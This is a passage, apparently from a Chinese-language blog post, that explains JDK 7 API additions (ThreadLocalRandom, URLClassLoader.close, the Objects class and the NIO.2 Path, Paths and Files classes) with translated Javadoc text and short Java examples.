方法</li><li>Parameters: seed - 最初的种子</li><li>Throws: UnsupportedOperationException - always</li></ul></li><li>next<ul><li>protected int next(int bits)</li><li>Description (从 Random 类中复制过来的):<ul><li>生成下一个伪随机数。子类应该覆盖它，因为所有其他方法都使用它</li><li><code>next</code> 的一般约定是它返回一个 int 值，如果参数位在 1 和 32 之间(包括)，那么返回值的许多低位将是(近似)独立选择的位值，每个位值都是(大约)同样可能是 0 或 1。<code>next</code> 方法由类 <code>Random</code> 实现，通过原子方式将种子更新为 <code>(seed * 0x5DEECE66DL + 0xBL) &amp; ((1L &lt;&lt; 48) - 1)</code> 并返回 <code>(int)(seed &gt;&gt;&gt; (48 - bits))</code>.<blockquote><p>The general contract of next is that it returns an int value and if the argument bits is between 1 and 32 (inclusive), then that many low-order bits of the returned value will be (approximately) independently chosen bit values, each of which is (approximately) equally likely to be 0 or 1.</p><p>The method next is implemented by class Random by atomically updating the seed to <code>(seed * 0x5DEECE66DL + 0xBL) &amp; ((1L &lt;&lt; 48) - 1)</code> and returning <code>(int)(seed &gt;&gt;&gt; (48 - bits))</code>.</p></blockquote></li><li>这是<a href="https://zhuanlan.zhihu.com/p/36301602">线性同余伪随机数</a>生成器，由 D.H.Lehmer 所定义并由 Donald E.Knuth 在《The Computer of Computer Programming，Volume 3：Seminumerical Algorithms，section 3.2.1》中描述。<blockquote><p>This is a linear congruential pseudorandom number generator, as defined by D. H. Lehmer and described by Donald E. Knuth in The Art of Computer Programming, Volume 3: Seminumerical Algorithms, section 3.2.1.</p></blockquote></li></ul></li><li>Overrides: Random 类的 next 方法</li><li>Parameters: bits - 随机位</li><li>Returns: 来自此随机数生成器序列的下一个伪随机值</li></ul></li><li>nextInt<ul><li>public int nextInt(int least, int bound)</li><li>Parameters:<ul><li>least - 下限</li><li>bound - 上限(不包括)</li></ul></li><li>Returns: 伪随机，在给定的最小值(包括)和绑定(不包括)之间均匀分布的值。</li><li>Throws: IllegalArgumentException - 如果最小值大于或等于上限</li></ul></li><li>nextLong<ul><li>public long nextLong(long n)</li><li>Parameters: n - 要返回的随机数的界限。必须是正数。</li><li>Returns: 伪随机，在 0(包括)和指定值(不包括)之间均匀分布的值。</li><li>Throws: IllegalArgumentException - 如果 n 不为正数</li></ul></li><li>nextLong<ul><li>public long nextLong(long least, long bound)</li><li>Parameters:<ul><li>least - 下限</li><li>bound - 上限(不包括)</li></ul></li><li>Returns: 伪随机，在给定的最小值(包括)和绑定(不包括)之间均匀分布的值。</li><li>Throws: IllegalArgumentException - 如果最小值大于或等于上限</li></ul></li><li>nextDouble<ul><li>public double nextDouble(double n)</li><li>Parameters: n - 要返回的随机数的界限。必须是正数。</li><li>Returns: 伪随机，在 0(包括)和指定值(不包括)之间均匀分布的值。</li><li>Throws: IllegalArgumentException - 如果 n 不为正数</li></ul></li><li>nextDouble<ul><li>public double nextDouble(double least, double bound)</li><li>Parameters:<ul><li>least - 下限</li><li>bound - 上限(不包括)</li></ul></li><li>Returns: 伪随机，在给定的最小值(包括)和绑定(不包括)之间均匀分布的值。</li><li>Throws: IllegalArgumentException - 如果最小值大于或等于上限</li></ul></li></ul><h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">MAX</span> <span class="token operator">=</span> <span class="token number">100000</span><span class="token punctuation">;</span><span class="token class-name">ThreadLocalRandom</span> threadLocalRandom <span class="token operator">=</span> <span class="token class-name">ThreadLocalRandom</span><span class="token punctuation">.</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> start <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">MAX</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    threadLocalRandom<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">long</span> end <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"use time1 : "</span> <span class="token operator">+</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">long</span> start2 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">MAX</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">long</span> end2 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start2<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"use time2 : "</span> <span class="token operator">+</span> end2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="URLClassLoader-类新增-close-方法"><a href="#URLClassLoader-类新增-close-方法" class="headerlink" title="URLClassLoader 类新增 close 方法"></a>URLClassLoader 类新增 close 方法</h2><p>它实现了 <a href="#try-%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%8A%A8%E5%85%B3%E9%97%AD%E8%B5%84%E6%BA%90">Closeable</a> 接口，可以及时关闭资源，后续重新加载 class 文件时不会导致资源被占用或者无法释放问</p><h3 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档:"></a>官方文档:</h3><blockquote><p>Closes this URLClassLoader, so that it can no longer be used to load new classes or resources that are defined by this loader. Classes and resources defined by any of this loader’s parents in the delegation hierarchy are still accessible. Also, any classes or resources that are already loaded, are still accessible.</p><p>In the case of jar: and file: URLs, it also closes any files that were opened by it. If another thread is loading a class when the close method is invoked, then the result of that load is undefined.</p><p>The method makes a best effort attempt to close all opened files, by catching IOExceptions internally. Unchecked exceptions and errors are not caught. Calling close on an already closed loader has no effect.</p></blockquote><p>关闭此 <code>URLClassLoader</code>，以便它不再可用于加载此加载程序定义的新类或资源。由委托层次结构中的任何加载程序父项定义的类和资源仍可访问。此外，仍可访问已加载的任何类或资源。</p><p>对于 <code>jar:</code> 和 <code>file:</code> 的 URL，它还会关闭由它打开的所有文件。如果在调用 <code>close</code> 方法时另一个线程正在加载类，则该加载的结果是未定义的。</p><p>该方法通过在内部捕获 <code>IOExceptions</code>，尽最大努力尝试关闭所有打开的文件。未捕获未经检查的异常和错误。在已经关闭的加载器上调用 <code>close</code> 无效。</p><h3 id="可能抛出的异常"><a href="#可能抛出的异常" class="headerlink" title="可能抛出的异常"></a>可能抛出的异常</h3><ul><li>IOException - if closing any file opened by this class loader resulted in an IOException. Any such exceptions are caught internally. If only one is caught, then it is re-thrown. If more than one exception is caught, then the second and following exceptions are added as suppressed exceptions of the first one caught, which is then re-thrown.</li><li>SecurityException - if a security manager is set, and it denies RuntimePermission(“closeClassLoader”)</li></ul><h2 id="套接字直接协议"><a href="#套接字直接协议" class="headerlink" title="套接字直接协议"></a>套接字直接协议</h2><p><a href="https://www.infoq.cn/article/Java-7-Sockets-Direct-Protocol?useSponsorshipSuggestions=true">套接字直接协议(Sockets Direct Protocol, SDP)</a>。</p><p>绕过操作系统的数据拷贝，将数据从一台机器的内存数据通过网络直接传输到另外一台机器的内存中。</p><blockquote><p>em…实际上我还没看懂，详细内容等我看懂了再补充</p></blockquote><h2 id="解决并发下加载-class-可能导致的死锁问题"><a href="#解决并发下加载-class-可能导致的死锁问题" class="headerlink" title="解决并发下加载 class 可能导致的死锁问题"></a>解决并发下加载 class 可能导致的死锁问题</h2><blockquote><p>这个是 JDK 1.6 的一些新版本就解决了，JDK 7 也做了一些优化。</p><p>详细参考<a href="https://docs.oracle.com/javase/7/docs/technotes/guides/lang/cl-mt.html">官方文档 Multithreaded Custom Class Loaders in Java SE 7</a></p></blockquote><h3 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h3><ul><li>类层次结构：<ul><li>A 类继承于 B 类</li><li>C 类继承于 D 类</li></ul></li><li>ClassLoader 委派层次结构:<ul><li>自定义类加载器 CL1:<ol><li>直接加载类 A</li><li>将 B 类委托给自定义类加载器 CL2</li></ol></li><li>自定义类加载器 CL2:<ol><li>直接加载类 C</li><li>将 D 类委托给自定义类加载器 CL1</li></ol></li></ul></li><li>JDK 7 之前: 多线程自定义类加载器在没有非循环委托模型时可能会死锁<ul><li>Thread 1:<ol><li>使用 CL1 加载 A 类 (锁定 CL1)</li><li>定义 A 类触发器</li><li>加载 B 类 (尝试锁定 CL2)</li></ol></li><li>Thread 2:<ol><li>使用 CL2 加载 C 类 (锁住 CL2)</li><li>定义 C 类触发器</li><li>加载 D 类 (尝试锁定 CL1)<blockquote><p>ClassLoader 类中的同步以前是严厉的，或者在技术方面，不够精细。在整个 ClassLoader 对象上加载同步的类的请求，这使得它容易出现死锁。</p></blockquote></li></ol></li></ul></li><li>JDK 7: 线程不再处于死锁状态，并且所有类都已成功加载<ul><li>Thread 1:<ol><li>使用 CL1 加载 A 类 (锁定 CL1 和 A 类)</li><li>定义 A 类触发器</li><li>加载 B 类 (锁定 CL2 和 B 类)</li></ol></li><li>Thread 2:<ol><li>使用 CL2 加载 C 类 (锁住 CL2 和 C 类)</li><li>定义 C 类触发器</li><li>加载 D 类 (锁定 CL1 和 D 类)</li></ol></li></ul></li></ul><h2 id="新增-Objects-类"><a href="#新增-Objects-类" class="headerlink" title="新增 Objects 类"></a>新增 Objects 类</h2><p>此类包含用于对对象进行操作的 9 静态实用方法。这些实用程序包括 null-safe 或 null-tolerant 方法，用于计算对象的哈希代码，返回对象的字符串以及比较两个对象。</p><p><strong>Objects 继承于 Object</strong></p><h3 id="Objects-equals"><a href="#Objects-equals" class="headerlink" title="Objects.equals"></a>Objects.equals</h3><ul><li>public static boolean equals(Object a, Object b)</li><li>Parameters:<ul><li>a - 一个对象</li><li>b - 要与 a 对象进行比较的对象</li></ul></li><li>Returns: 如果参数彼此相等则为true，否则为false。因此，如果两个参数都为null，则返回true，如果只有一个参数为null，则返回false。否则，通过使用第一个参数的 equals 方法(Object.equals)确定相等性。</li><li>参见 Object.equals(Object)</li></ul><h3 id="Objects-deepEquals"><a href="#Objects-deepEquals" class="headerlink" title="Objects.deepEquals"></a>Objects.deepEquals</h3><ul><li>public static boolean deepEquals(Object a, Object b)</li><li>Parameters:<ul><li>a - 一个对象</li><li>b - 要与 a 对象进行深度比较的对象</li></ul></li><li>Returns: 如果参数彼此非常相等则为 true，否则为 false。两个 null 值深度相等。如果两个参数都是数组，则使用 <code>Arrays.deepEquals</code> 中的算法确定相等性。否则，通过使用第一个参数的 equals 方法(Object.equals)确定相等性。</li><li>参见:<ul><li>Arrays.deepEquals(Object[], Object[])</li><li><a href="#Objects-equals">Objects.equals(Object, Object)</a></li><li>Object.equals(Object)</li></ul></li></ul><h3 id="Objects-hashCode"><a href="#Objects-hashCode" class="headerlink" title="Objects.hashCode"></a>Objects.hashCode</h3><ul><li>public static int hashCode(Object o)</li><li>Parameters: o - 一个对象</li><li>Returns: 非 null 参数的哈希码，参数是 null 则为 0</li><li>参见:<ul><li>Object.hashCode()</li></ul></li></ul><h3 id="Objects-hash"><a href="#Objects-hash" class="headerlink" title="Objects.hash"></a>Objects.hash</h3><ul><li>public static int hash(Object… values)</li><li>Parameters: values - 要散列的对象序列</li><li>Returns: 输入对象序列的哈希值</li><li>参见:<ul><li>Arrays.hashCode(Object[])</li><li>List.hashCode()</li></ul></li></ul><p>为一系列输入值生成哈希码。生成的哈希代码就好像所有输入值都放在一个数组中一样，并且通过调用 <code>Arrays.hashCode(Object [])</code> 对该数组进行哈希处理。</p><p>此方法对于在包含多个字段的对象上实现 <code>Object.hashCode()</code> 非常有用。例如，如果一个对象有三个字段 x，y 和 z，则可以写：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>警告：提供单个对象引用时，返回的值不等于该对象引用的哈希码。可以通过调用 <code>hashCode(Object)</code> 来计算此值</strong></p></blockquote><h3 id="Objects-toString"><a href="#Objects-toString" class="headerlink" title="Objects.toString"></a>Objects.toString</h3><ul><li>public static String toString(Object o)</li><li>Parameters: o - 一个对象</li><li>Returns: 调用 toString 获取非 null 参数的结果，参数为 null 则返回 “null”。</li><li>参见:<ul><li>Object.toString()</li><li>String.valueOf(Object)</li></ul></li></ul><h3 id="Objects-toString-1"><a href="#Objects-toString-1" class="headerlink" title="Objects.toString"></a>Objects.toString</h3><ul><li>public static String toString(Object o, String nullDefault)</li><li>Parameters:<ul><li>o - 一个对象</li><li>nullDefault - 如果第一个参数为 null，则返回此值。即默认值</li></ul></li><li>Returns: 如果第一个参数不为 null，则在第一个参数上调用 toString，否则返回第二个参数。</li><li>参见: toString(Object)</li></ul><h3 id="Objects-compare"><a href="#Objects-compare" class="headerlink" title="Objects.compare"></a>Objects.compare</h3><ul><li>public static <t> int compare(T a, T b, Comparator&lt;? super T&gt; c)</t></li><li>Type Parameters: T - 被比较对象的类型</li><li>Parameters:<ul><li>a - 一个对象</li><li>b - 要与 a 进行比较的对象</li><li>c - 用来比较前两个参数的比较器</li></ul></li><li>Returns: 如果参数相同则为 0，否则为 <code>c.compare(a，b)</code>。因此，如果两个参数都为 null ，则返回 0</li><li>参见:<ul><li>Comparable</li><li>Comparator</li></ul></li></ul><blockquote><p>请注意，如果其中一个参数为 null，则可能会也可能不会抛出 NullPointerException，具体取决于 Comparator 选择具有空值的排序策略(如果有的话)。</p></blockquote><h3 id="Objects-requireNonNull"><a href="#Objects-requireNonNull" class="headerlink" title="Objects.requireNonNull"></a>Objects.requireNonNull</h3><ul><li>public static <t> T requireNonNull(T obj)</t></li><li>Type Parameters: T - 被引用的类型</li><li>Parameters: obj - 被检查的对象引用</li><li>Returns: 如果 obj 不为 null 就返回 obj</li><li>Throws: NullPointerException - 如果 obj 为 null</li></ul><p>检查指定的对象引用是否为 null。此方法主要用于在方法和构造函数中进行参数验证，如下所示:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token class-name">Bar</span> bar<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">requireNonNull</span><span class="token punctuation">(</span>bar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Objects-requireNonNull-1"><a href="#Objects-requireNonNull-1" class="headerlink" title="Objects.requireNonNull"></a>Objects.requireNonNull</h3><ul><li>public static <t> T requireNonNull(T obj, String message)</t></li><li>Type Parameters: T - 被引用的类型</li><li>Parameters:<ul><li>obj - 被检查的对象引用</li><li>message - 在抛出 NullPointerException 时使用的详细消息</li></ul></li><li>Returns: 如果 obj 不为 null 就返回 obj</li><li>Throws: NullPointerException - 如果 obj 为 null</li></ul><p>检查指定的对象引用是否为 null，如果是，则抛出自定义的 NullPointerException。此方法主要用于在具有多个参数的方法和构造函数中进行参数验证，如下所示:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token class-name">Bar</span> bar<span class="token punctuation">,</span> <span class="token class-name">Baz</span> baz<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">requireNonNull</span><span class="token punctuation">(</span>bar<span class="token punctuation">,</span> <span class="token string">"bar must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>baz <span class="token operator">=</span> <span class="token class-name">Objects</span><span class="token punctuation">.</span><span class="token function">requireNonNull</span><span class="token punctuation">(</span>baz<span class="token punctuation">,</span> <span class="token string">"baz must not be null"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="增强的文件系统"><a href="#增强的文件系统" class="headerlink" title="增强的文件系统"></a>增强的文件系统</h2><p>JDK 7 推出了全新的 NIO2.0 API 以此改变针对文件管理的不便，使得在 <code>java.nio.file</code> 包下使用 <code>Path</code>、<code>Paths</code>、<code>Files</code>、<code>WatchService</code>、<code>FileSystem</code> 等常用类型可以很好的简化开发人员对文件管理的编码工作。</p><h3 id="Path-接口和-Paths-类"><a href="#Path-接口和-Paths-类" class="headerlink" title="Path 接口和 Paths 类"></a>Path 接口和 Paths 类</h3><p>Path 接口的某些功能其实可以和 <code>java.io</code> 包下的 File 类等价，当然这些功能仅限于<strong>只读</strong>操作。在实际开发过程中，开发人员可以联用 Path 接口和 Paths 类，从而获取文件的一系列上下文信息。</p><p>Paths 类仅包含通过转换路径字符串或 URI 返回 Path 的静态方法。</p><h4 id="Paths-get"><a href="#Paths-get" class="headerlink" title="Paths.get"></a>Paths.get</h4><p>将路径字符串或在连接时形成路径字符串的字符串序列转换为 Path。如果 more 没有指定任何元素，那么第一个参数的值就是要转换的路径字符串。如果 more 指定了一个或多个元素，那么每个非空字符串(包括first)都被认为是名称元素的序列(参见 Path 接口)，并被连接起来形成一个路径字符串。有关如何联接字符串的详细信息是提供程序指定的，但通常使用名称分隔符作为分隔符联接字符串。例如，如果名称分隔符是“/”，并调用 <code>getPath("/foo", "bar", "gus")</code>，则路径字符串 <code>"/foo/bar/gus"</code> 将转换为路径。如果 first 是空字符串， more 不包含任何非空字符串，则返回表示空路径的路径。</p><p>该路径是通过调用 <code>FileSystem.getPath</code> 方法获得的</p><p>注意，虽然这个方法非常方便，但是使用它将意味着假定对默认 <code>FileSystem</code>(<code>FileSystem.getDefault</code>) 的引用，并限制调用代码的实用程序。因此，不应该在旨在灵活重用的库代码中使用它。一个更灵活的选择是使用现有的 <code>Path</code> 实例作为锚，例如:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Path</span> dir <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">Path</span> path <span class="token operator">=</span> dir<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>public static Path get(String first, String… more)</li><li>Parameters:<ul><li>first - 路径字符串或路径字符串的初始部分</li><li>more - 要连接以形成路径字符串的其他字符串</li></ul></li><li>Returns: 结果 Path</li><li>Throws: InvalidPathException - 如果路径字符串无法转换为 Path</li><li>参见: FileSystem.getPath(java.lang.String, java.lang.String…)</li></ul><h4 id="Pahts-get"><a href="#Pahts-get" class="headerlink" title="Pahts.get"></a>Pahts.get</h4><p>将给定的 URI 转换为 Path 对象。</p><p>此方法在已安装的提供程序上迭代，以定位由给定 URI 的 URI 模式标识的提供程序。URI 方案的比较不考虑大小写。如果找到提供者，则调用其 <code>getPath</code> 方法来转换 URI。</p><p>对于由 URI 模式 “file” 标识的默认提供程序，给定 URI 有一个非空路径组件，以及未定义的查询和片段组件。是否存在权限组件是取决于平台的。返回的 Path 与默认文件系统(<code>FileSystem.getDefault</code>)相关联。</p><p>默认提供程序为 File 类提供了类似的往返保证。对于给定的 Path p，它保证</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">toUri</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span><span class="token function">toAbsolutePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以只要原始 Path、URI 和新 Path 都是在同一个 Java 虚拟机(可能是不同的调用)中创建的。其他提供者是否提供任何担保是取决于提供者的，因此未指定。</p><ul><li>public static Path get(URI uri)</li><li>Parameters: uri - 要转换的 URI</li><li>Returns: 结果 Path</li><li>Throws:<ul><li>IllegalArgumentException - 如果 uri 参数的前提条件不成立则抛出此异常。URI 的格式是取决于提供者的。</li><li>FileSystemNotFoundException - 由 URI 标识的文件系统不存在并且无法自动创建，或者未安装由 URI 的方案组件标识的提供程序</li><li>SecurityException - 如果安装了安全管理器并且它拒绝访问文件系统的未指定权限</li></ul></li></ul><h4 id="getNameCount"><a href="#getNameCount" class="headerlink" title="getNameCount"></a>getNameCount</h4><ul><li>int getNameCount()</li><li>Returns: 路径中元素的数量，如果此路径仅表示根组件，则为 0</li></ul><h4 id="getFileName"><a href="#getFileName" class="headerlink" title="getFileName"></a>getFileName</h4><p>此路径作为 Path 对象表示的文件或目录的名称。文件名是目录层次结构中离根目录最远的元素。</p><ul><li>public String getFileName()</li><li>Returns: 表示文件或目录名称的路径，如果此路径具有零个元素，则为 null</li></ul><h4 id="getRoot"><a href="#getRoot" class="headerlink" title="getRoot"></a>getRoot</h4><ul><li>Path getRoot()</li><li>Returns: 此路径的根组件作为 Path 对象，如果此路径没有根组件，则为 null</li></ul><h4 id="getParent"><a href="#getParent" class="headerlink" title="getParent"></a>getParent</h4><p>The parent of this path object consists of this path’s root component, if any, and each element in the path except for the farthest from the root in the directory hierarchy. This method does not access the file system; the path or its parent may not exist. Furthermore, this method does not eliminate special names such as “.” and “..” that may be used in some implementations. On UNIX for example, the parent of “/a/b/c” is “/a/b”, and the parent of “x/y/.” is “x/y”. This method may be used with the normalize method, to eliminate redundant names, for cases where shell-like navigation is required.<br>这个 Path 对象的父对象由这个路径的根组件(如果有的话)和路径中的每个元素(目录层次结构中离根最远的元素除外)组成。此方法不访问文件系统; 路径或其父路径可能不存在。此外，此方法不排除可能在某些实现中使用的特殊名称，如“.”和“..”。例如，在UNIX上，“/a/b/c”的父节点是“/a/b”，“x/y/.”的父节点是“x/y”。此方法可与normalize方法一起使用，以便在需要类shell导航的情况下消除冗余名称。</p><ul><li>Path getParent()</li><li>Returns: 父路径，如果此路径没有父路径，则返回 null</li></ul><p>获取当前文件上级关联目录</p><blockquote><p>其他 Path 接口方法请看 JDK 7 文档，太多了，哈哈哈</p></blockquote><h3 id="Files-类"><a href="#Files-类" class="headerlink" title="Files 类"></a>Files 类</h3><p>联用 Path 接口和 Paths 类可以很方便的访问到目标文件的上下文信息。当然这些操作全都是只读的，如果开发人员想对文件进行其它非只读操作，比如文件的创建、修改、删除等操作，则可以使用 Files 类型进行操作。</p><p>Files 类只包含对文件、目录或其他类型的文件进行操作的<strong>静态</strong>方法。在大多数情况下，这里定义的方法将委托给相关的文件系统提供程序来执行文件操作。</p><p>Files 类型常用方法如下：</p><h4 id="Files-createFile"><a href="#Files-createFile" class="headerlink" title="Files.createFile"></a>Files.createFile</h4><p>在指定的目标目录创建一个新的空文件，如果该文件已存在则失败。检查文件是否存在以及创建新文件（如果不存在）是针对可能影响目录的所有其他文件系统活动的原子操作。<br>attrs 参数是可选的文件属性，可在创建文件时以原子方式设置。每个属性都由其名称标识。如果数组中包含多个同名属性，则忽略除最后一次出现的所有属性。</p><ul><li>public static Path createFile(Path path, FileAttribute&lt;?&gt;… attrs) throws IOException</li><li>Parameters:<ul><li>path - 要创建的文件的路径</li><li>attrs - 创建文件时要自动设置的文件属性的可选列表</li></ul></li><li>Returns: the file</li><li>Throws:<ul><li>UnsupportedOperationException - if the array contains an attribute that cannot be set atomically when creating the file</li><li>FileAlreadyExistsException - 如果该名称的文件已存在(可选的特定异常)</li><li>IOException - 如果发生 I/O 错误或父目录不存在</li><li>SecurityException - 对于默认提供程序，并且安装了安全管理器，将调用 <code>checkWrite</code> 方法以检查对新文件的写访问权。</li></ul></li></ul><h4 id="Files-delete"><a href="#Files-delete" class="headerlink" title="Files.delete"></a>Files.delete</h4><p>删除指定目标路径的文件或文件夹</p><p>使用时可能需要检查文件以确定文件是否是目录。因此，该方法相对于其他文件系统操作可能不是原子的。如果文件是符号链接(快捷方式？)，则删除符号链接本身，而不是原文件。</p><p>如果文件是目录，则该目录必须为空。在一些实现中，目录具有用于创建目录时创建的特殊文件或链接的条目。在这样的实现中，当仅存在特殊条目时，目录被认为是空的。此方法可与 <code>walkFileTree</code> 方法一起使用，以删除目录和目录中的所有条目，或者删除所需的整个文件树。</p><p>在某些操作系统上，可能无法删除正在被 Java 虚拟机或其他程序打开和使用的文件。</p><ul><li>public static void delete(Path path) throws IOException</li><li>Parameters: path - 要删除的文件的路径</li><li>Throws:<ul><li>NoSuchFileException - 如果文件不存在(可选的特定异常)</li><li>DirectoryNotEmptyException - 如果该文件是一个目录，否则无法删除，因为该目录不为空(可选的特定异常)</li><li>IOException - 如果发生 I/O 错误</li><li>SecurityException - 对于默认提供程序，并且安装了安全管理器，将调用 <code>SecurityManager.checkDelete(String)</code> 方法以检查对文件的删除访问权限</li></ul></li></ul><h4 id="Files-copy"><a href="#Files-copy" class="headerlink" title="Files.copy"></a>Files.copy</h4><p>复制操作，总共有三个重载</p><h5 id="public-static-long-copy-InputStream-in-Path-target-CopyOption…-options-throws-IOException"><a href="#public-static-long-copy-InputStream-in-Path-target-CopyOption…-options-throws-IOException" class="headerlink" title="public static long copy(InputStream in, Path target, CopyOption… options) throws IOException"></a>public static long copy(InputStream in, Path target, CopyOption… options) throws IOException</h5><p>将<strong>输入流中的</strong>所有字节复制到文件。返回时，输入流将位于流的末尾。</p><p>默认情况下，如果目标文件已存在或者是符号链接，则复制将失败。如果指定了 <code>REPLACE_EXISTING</code> 选项，并且目标文件已存在，则如果它不是非空目录，则替换它。如果目标文件存在且是符号链接，则替换符号链接。在此版本中，<code>REPLACE_EXISTING</code> 选项是此方法必须支持的唯一选项。未来版本可能支持其他选项。</p><p>如果从输入流读取或写入文件时发生 I/O 错误，则可以在创建目标文件之后以及在读取或写入某些字节之后执行此操作。因此，输入流可能不在流的末尾并且可能处于不一致状态。如果发生 I/O 错误，强烈建议立即关闭输入流。</p><p>此方法可能会无限期地阻止从输入流中读取（或写入文件）。在复制期间输入流异步关闭或线程中断的行为是由输入流和文件系统提供程序指定的，因此未指定。</p><p>示例: 假设我们想捕获一个网页并将其保存到文件中:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Path</span> path <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">;</span><span class="token class-name">URI</span> u <span class="token operator">=</span> <span class="token constant">URI</span><span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"http://java.sun.com/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">InputStream</span> in <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>in<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Parameters:<ul><li>in - 要读取的输入流</li><li>target - 文件的路径(拷贝到那里)</li><li>options - 指定副本应如何完成的选项</li></ul></li><li>Returns: 读取或写入的字节数</li><li>Throws:<ul><li>IOException - 如果读取或写入时发生 I/O 